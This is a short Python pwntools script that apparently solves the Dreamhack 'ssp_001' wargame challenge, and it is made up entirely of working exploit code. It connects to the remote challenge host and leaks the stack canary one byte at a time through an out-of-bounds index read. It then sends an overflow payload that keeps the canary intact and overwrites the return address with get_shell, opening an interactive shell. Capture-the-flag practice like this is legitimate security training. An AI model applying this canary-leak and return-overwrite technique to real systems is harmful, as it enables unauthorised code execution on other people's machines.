#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./ssp_001")
p = remote("host1.dreamhack.games", 8244)
elf = ELF("./ssp_001")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
get_shell = elf.symbols['get_shell']

p.sendafter("> ", 'F')
p.sendafter("box input : ", 'A'*0x40)
canary = ""
for i in range(4):
    p.sendafter("> ", 'P')
    p.sendlineafter("index : ", str(0x80+i))
    p.recvuntil("is : ")
    canary = p.recvuntil("\n")[:2]+ canary

canary = int(canary, 16)
log.info("canary : "+hex(canary))

p.sendafter("> ", "E")
pay = 'A'*0x40 + p32(canary) + 'B'*8 + p32(get_shell)
p.sendlineafter("Size : ", str(len(pay)))
p.sendafter("Name : ", pay)

p.interactive()
